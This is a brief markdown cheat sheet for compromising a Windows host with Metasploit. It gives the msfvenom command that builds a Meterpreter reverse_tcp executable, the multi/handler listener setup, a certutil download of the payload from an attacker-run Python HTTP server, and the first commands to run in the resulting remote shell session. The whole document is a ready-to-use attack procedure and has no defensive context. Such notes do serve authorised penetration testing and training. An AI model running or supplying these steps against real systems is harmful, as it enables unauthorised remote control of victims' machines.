### On Kali Linux, host files using python server
```bash
  # python3 -m http.server 8000
```
### Generate Meterpreter Payload
```
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali-IP> LPORT=443 -f exe -o meter.exe
```
### Configure Metasploit Listener
```
# msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST <kali-IP>
msf exploit(multi/handler) > set LPORT 443
msf exploit(multi/handler) > run
```
### Transfer and Execute the payload On Windows
```
certutil -urlcache -f http://<kali-IP>:8000/meter.exe meter.exe (cmd)
http://<kali-IP>:8000/meter.exe (browser)
```
### A session will start in the kali
```
meterpreter > sysinfo  # -> for system information
meterpreter > shell    # -> (windows shell access).
```
